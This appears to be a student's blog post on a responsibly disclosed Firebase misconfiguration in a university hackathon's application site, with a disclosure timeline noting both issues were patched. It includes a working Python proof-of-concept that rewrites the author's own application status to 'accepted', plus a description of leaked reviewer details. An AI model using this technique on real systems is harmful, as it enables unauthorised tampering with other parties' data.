<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://jamiepalatnik.com/day-51-beautiful-soup/">Original</a>
    <h1>Day 51: Beautiful Soup</h1>
    
    <div id="readability-page-1" class="page"><div><p>With all the buzz <a href="https://finance.yahoo.com/news/canadas-largest-ai-hackathon-mobilizes-111000713.html">online</a> and among my friends about <a href="https://genaigenesis.ca/">GenAI Genesis 2025</a>, a generative AI hackathon hosted at my school, the University of Toronto, I decided to apply even though I was pretty busy that weekend, hoping my schedule would clear by the time the hackathon came around. The sequence of events that followed led me into finding a vulnerability that let me accept my own hackathon application, before applications had even officially closed.</p><h2 id="story-time">story time!</h2><p>After making my account on the site at 3 o’clock in the morning, I somehow realized that I had better things to do at the time (like sleeping), and so I decided to apply the following day. Oddly, my password manager (KeePassXC for those curious), didn’t save my password and I had to reset it:</p><pre tabindex="0"><code>Hello,
Follow this link to reset your genai-hackathon-2024 password for your &lt;email&gt; account.
https://genai-hackathon-2024.firebaseapp.com/__/auth/action?mode=resetPassword...
If you didn’t ask to reset your password, you can ignore this email.
Thanks,
Your genai-hackathon-2024 team (2024?)
</code></pre><p>I was sent a link to a site on the <code>firebaseapp.com</code> domain, and this reminded me of the <a href="https://mrbruh.com/chattr/">countless</a> <a href="https://env.fail/posts/firewreck-1/">blog posts</a> and <a href="https://venki.dev/notes/firestore-vuln">articles</a> I’ve read on people finding misconfigurations in firebase, and I was curious to see if this site would fare any better.</p><h2 id="getting-acquainted">getting acquainted</h2><p>I started of by testing some of the low hanging fruit I’ve previously seen, but instead of using <a href="https://github.com/0xbigshaq/firepwn-tool">Firepwn</a> like I saw in some blog posts, I used a python library called <code>pyrebase</code> (or well a fork of it that supported newer versions of python), which is just a wrapper around the firebase API.</p><p>But before using either tool, I first needed to extract the <a href="https://firebase.google.com/docs/web/learn-more#config-object">firebase config object</a> from the frontend, which I did by searching for some of the field names. The config object is only used for identification to firebase (even the oddly named <code>apiKey</code>), and none of these identifiers are supposed to be a secret.</p><div><pre tabindex="0"><code data-lang="javascript"><span><span><span>n</span><span>.</span><span>ZF</span><span>)({</span>
</span></span><span><span>    <span>apiKey</span><span>:</span> <span>&#34;AIzaSyAAign9HlDM7bcdWhsIzeRlvNWbLglmuUY&#34;</span><span>,</span>
</span></span><span><span>    <span>authDomain</span><span>:</span> <span>&#34;genai-hackathon-2024.firebaseapp.com&#34;</span><span>,</span>
</span></span><span><span>    <span>databaseURL</span><span>:</span> <span>&#34;https://genai-hackathon-2024-default-rtdb.firebaseio.com&#34;</span><span>,</span>
</span></span><span><span>    <span>projectId</span><span>:</span> <span>&#34;genai-hackathon-2024&#34;</span><span>,</span>
</span></span><span><span>    <span>storageBucket</span><span>:</span> <span>&#34;genai-hackathon-2024.firebasestorage.app&#34;</span><span>,</span>
</span></span><span><span>    <span>messagingSenderId</span><span>:</span> <span>o</span><span>.</span><span>env</span><span>.</span><span>NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID</span><span>,</span>
</span></span><span><span>    <span>appId</span><span>:</span> <span>&#34;1:212015883358:web:085918af35bc10d23100cf&#34;</span><span>,</span>
</span></span><span><span>    <span>measurementId</span><span>:</span> <span>o</span><span>.</span><span>env</span><span>.</span><span>NEXT_PUBLIC_FIREBASE_MEASUREMENT_ID</span>
</span></span><span><span><span>});</span>
</span></span></code></pre></div><p>While looking for the config object, I realized I had access to the original source code of the project. (before it was webpacked &amp; minified) This is possible because <code>sentry.io</code> before v9 <a href="https://github.com/getsentry/sentry-javascript/issues/4489">emitted source maps to production by default</a>.
<img alt="devtools-src-code.png" loading="lazy" src="https://fastcall.dev/devtools-src-code.png"/>
Continuing to test the low hanging fruit, I checked to see if there was misconfigured read access to the entire database.</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>import</span> <span>empyrebase</span>
</span></span><span><span>
</span></span><span><span><span>config</span> <span>=</span> <span>{</span>
</span></span><span><span>    <span>&#34;apiKey&#34;</span><span>:</span> <span>&#34;AIzaSyAAign9HlDM7bcdWhsIzeRlvNWbLglmuUY&#34;</span><span>,</span>
</span></span><span><span>    <span>&#34;authDomain&#34;</span><span>:</span> <span>&#34;genai-hackathon-2024.firebaseapp.com&#34;</span><span>,</span>
</span></span><span><span>    <span>&#34;databaseURL&#34;</span><span>:</span> <span>&#34;https://genai-hackathon-2024-default-rtdb.firebaseio.com&#34;</span><span>,</span>
</span></span><span><span>    <span>&#34;storageBucket&#34;</span><span>:</span> <span>&#34;genai-hackathon-2024.firebasestorage.app&#34;</span><span>,</span>
</span></span><span><span>    <span>&#34;projectId&#34;</span><span>:</span> <span>&#34;genai-hackathon-2024&#34;</span>
</span></span><span><span><span>}</span>
</span></span><span><span>
</span></span><span><span><span>firebase</span> <span>=</span> <span>empyrebase</span><span>.</span><span>initialize_app</span><span>(</span><span>config</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>auth</span> <span>=</span> <span>firebase</span><span>.</span><span>auth</span><span>()</span>
</span></span><span><span>
</span></span><span><span><span>user</span> <span>=</span> <span>auth</span><span>.</span><span>sign_in_with_email_and_password</span><span>(</span><span>&#34;&lt;email&gt;&#34;</span><span>,</span> <span>&#34;&lt;password&gt;&#34;</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>db</span> <span>=</span> <span>firebase</span><span>.</span><span>database</span><span>()</span>
</span></span><span><span>
</span></span><span><span><span>print</span><span>(</span><span>db</span><span>.</span><span>get</span><span>(</span><span>user</span><span>[</span><span>&#39;idToken&#39;</span><span>]))</span>
</span></span><span><span><span># &#34;error&#34; : &#34;Permission denied&#34;</span>
</span></span></code></pre></div><h2 id="the-bug">the bug</h2><p>With no luck so far, I decide to check how the site communicated with firebase, where I found a very <em>interesting</em> design choice.
<img alt="firebase-operations.png" loading="lazy" src="https://fastcall.dev/firebase-operations.png"/>
The site was grabbing <em>all</em> the user data it had stored about my application, and only then parsing the data received for what it actually wanted. When submitting a new application, it set the whole application object as well.</p><div><pre tabindex="0"><code data-lang="javascript"><span><span><span>type</span> <span>statusOptions</span> <span>=</span>
</span></span><span><span>    <span>|</span> <span>&#39;not started&#39;</span>
</span></span><span><span>    <span>|</span> <span>&#39;not completed&#39;</span>
</span></span><span><span>    <span>|</span> <span>&#39;submitted&#39;</span>
</span></span><span><span>    <span>|</span> <span>&#39;waitlisted&#39;</span>
</span></span><span><span>    <span>|</span> <span>&#39;rejected&#39;</span>
</span></span><span><span>    <span>|</span> <span>&#39;accepted&#39;</span>
</span></span><span><span>    <span>|</span> <span>&#39;admitted&#39;</span>
</span></span><span><span>    <span>|</span> <span>&#39;rejected offer&#39;</span><span>;</span>
</span></span><span><span>
</span></span><span><span><span>const</span> <span>application</span> <span>=</span> <span>{</span>
</span></span><span><span>    <span>userId</span><span>:</span> <span>uid</span><span>,</span>
</span></span><span><span>    <span>applicationId</span><span>:</span> <span>uid</span><span>,</span>
</span></span><span><span>    <span>applicationStatus</span><span>:</span> <span>status</span> <span>as</span> <span>statusOptions</span><span>,</span>
</span></span><span><span>    <span>section1</span><span>:</span> <span>{</span>
</span></span><span><span>    <span>// boring actual hackathon application stuff
</span></span></span><span><span><span></span>    <span>}</span>
</span></span><span><span>    <span>statusFlags</span><span>:</span> <span>{</span>
</span></span><span><span>        <span>reviewed</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>        <span>shortlisted</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>        <span>accepted</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>        <span>rejected</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>        <span>rsvp</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span><span>};</span>
</span></span></code></pre></div><p>After noticing this, I attempted to send a <code>update</code> request to the database with the <code>applicationStatus</code> as <code>accepted</code>,</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>import</span> <span>empyrebase</span>
</span></span><span><span><span>import</span> <span>sys</span>
</span></span><span><span>
</span></span><span><span><span>firebase</span> <span>=</span> <span>empyrebase</span><span>.</span><span>initialize_app</span><span>(</span><span>config</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>auth</span> <span>=</span> <span>firebase</span><span>.</span><span>auth</span><span>()</span>
</span></span><span><span>
</span></span><span><span><span>user</span> <span>=</span> <span>auth</span><span>.</span><span>sign_in_with_email_and_password</span><span>(</span><span>sys</span><span>.</span><span>argv</span><span>[</span><span>1</span><span>],</span> <span>sys</span><span>.</span><span>argv</span><span>[</span><span>2</span><span>])</span>
</span></span><span><span>
</span></span><span><span><span>db</span> <span>=</span> <span>firebase</span><span>.</span><span>database</span><span>()</span>
</span></span><span><span>
</span></span><span><span><span>application_info</span> <span>=</span> <span>db</span><span>.</span><span>child</span><span>(</span><span>&#34;applications&#34;</span><span>)</span><span>.</span><span>child</span><span>(</span><span>user</span><span>[</span><span>&#34;localId&#34;</span><span>])</span><span>.</span><span>get</span><span>(</span><span>user</span><span>[</span><span>&#34;idToken&#34;</span><span>])</span>
</span></span><span><span><span>application</span> <span>=</span> <span>db</span><span>.</span><span>child</span><span>(</span><span>&#34;applications&#34;</span><span>)</span><span>.</span><span>child</span><span>(</span><span>user</span><span>[</span><span>&#34;localId&#34;</span><span>])</span>
</span></span><span><span>
</span></span><span><span><span>print</span><span>(</span><span>&#34;before:&#34;</span><span>)</span>
</span></span><span><span><span>for</span> <span>row</span> <span>in</span> <span>application_info</span><span>.</span><span>each</span><span>():</span>
</span></span><span><span>    <span>if</span> <span>row</span><span>.</span><span>key</span><span>()</span> <span>==</span> <span>&#34;applicationStatus&#34;</span><span>:</span>
</span></span><span><span>        <span>print</span><span>(</span><span>f</span><span>&#34;applicationStatus: </span><span>{</span><span>row</span><span>.</span><span>val</span><span>()</span><span>}</span><span>&#34;</span><span>)</span>
</span></span><span><span>    <span>if</span> <span>row</span><span>.</span><span>key</span><span>()</span> <span>==</span> <span>&#34;statusFlags&#34;</span><span>:</span>
</span></span><span><span>        <span>print</span><span>(</span><span>f</span><span>&#34;statusFlags: </span><span>{</span><span>row</span><span>.</span><span>val</span><span>()</span><span>}</span><span>&#34;</span><span>)</span>
</span></span><span><span>
</span></span><span><span><span>dict</span> <span>=</span> <span>{</span>
</span></span><span><span>    <span>&#34;applicationStatus&#34;</span><span>:</span> <span>&#34;accepted&#34;</span><span>,</span>
</span></span><span><span>    <span>&#34;statusFlags&#34;</span><span>:</span> <span>{</span>
</span></span><span><span>        <span>&#34;accepted&#34;</span><span>:</span> <span>True</span><span>,</span>
</span></span><span><span>        <span>&#34;rejected&#34;</span><span>:</span> <span>False</span><span>,</span>
</span></span><span><span>        <span>&#34;reviewed&#34;</span><span>:</span> <span>True</span><span>,</span>
</span></span><span><span>        <span>&#34;shortlisted&#34;</span><span>:</span> <span>True</span><span>,</span>
</span></span><span><span>    <span>},</span>
</span></span><span><span><span>}</span>
</span></span><span><span>
</span></span><span><span><span>application</span><span>.</span><span>update</span><span>(</span><span>dict</span><span>,</span> <span>user</span><span>[</span><span>&#34;idToken&#34;</span><span>])</span>
</span></span><span><span>
</span></span><span><span><span>application_info</span> <span>=</span> <span>db</span><span>.</span><span>child</span><span>(</span><span>&#34;applications&#34;</span><span>)</span><span>.</span><span>child</span><span>(</span><span>user</span><span>[</span><span>&#34;localId&#34;</span><span>])</span><span>.</span><span>get</span><span>(</span><span>user</span><span>[</span><span>&#34;idToken&#34;</span><span>])</span>
</span></span><span><span>
</span></span><span><span><span>print</span><span>(</span><span>&#34;after:&#34;</span><span>)</span>
</span></span><span><span><span>for</span> <span>row</span> <span>in</span> <span>application_info</span><span>.</span><span>each</span><span>():</span>
</span></span><span><span>    <span>if</span> <span>row</span><span>.</span><span>key</span><span>()</span> <span>==</span> <span>&#34;applicationStatus&#34;</span><span>:</span>
</span></span><span><span>        <span>print</span><span>(</span><span>f</span><span>&#34;applicationStatus: </span><span>{</span><span>row</span><span>.</span><span>val</span><span>()</span><span>}</span><span>&#34;</span><span>)</span>
</span></span><span><span>    <span>if</span> <span>row</span><span>.</span><span>key</span><span>()</span> <span>==</span> <span>&#34;statusFlags&#34;</span><span>:</span>
</span></span><span><span>        <span>print</span><span>(</span><span>f</span><span>&#34;statusFlags: </span><span>{</span><span>row</span><span>.</span><span>val</span><span>()</span><span>}</span><span>&#34;</span><span>)</span>
</span></span></code></pre></div><pre tabindex="0"><code>$ python genai.py
before:
applicationStatus: submitted
statusFlags: {&#39;accepted&#39;: False, &#39;rejected&#39;: False, &#39;reviewed&#39;: False, &#39;shortlisted&#39;: False}
after:
applicationStatus: accepted
statusFlags: {&#39;accepted&#39;: True, &#39;rejected&#39;: False, &#39;reviewed&#39;: True, &#39;shortlisted&#39;: True}
</code></pre><p>It worked :D</p><h2 id="bonus-bug-information-leakage">bonus bug: information leakage</h2><p>After disclosing the initial vulnerability, I discovered that while it was no longer possible to write to any values the site itself didn’t modify, since the site still grabbed the whole application object, you could still read sensitive information about your own application, such as getting your application’s acceptance status early, your reviewer’s <strong>full name</strong>, any comments they made about you, and their overall rating of your application. (Reviewer’s names have been redacted for privacy concerns)
<img alt="reviewed-1.png" loading="lazy" src="https://fastcall.dev/reviewed-1.png"/>
<img alt="reviewed-2.png" loading="lazy" src="https://fastcall.dev/reviewed-2.png"/>
<img alt="reviewed-3.png" loading="lazy" src="https://fastcall.dev/reviewed-3.png"/>
I later verified this was fully fixed by the maintainers modifying the site to have specific functions to fetch what it needed, allowing for the further tightening of database rules.</p><h2 id="disclosure-timeline-mmddyyyy">disclosure timeline (mm/dd/yyyy)</h2><ul><li>09/03/2025 - vulnerability disclosed</li><li>09/03/2025 - initial patch</li><li>10/03/2025 - information leakage disclosed</li><li>12/03/2025 - final patch</li></ul><h2 id="conclusion">conclusion</h2><p>Thanks for reading til the end! I hope you enjoyed reading this blog post as much as I enjoyed making it!
<em>p.s, you should follow me on <a href="https://x.com/__faastcall">X/twitter</a>, I’m a freshman posting some cool stuff :)</em></p></div></div>
  </body>
</html>
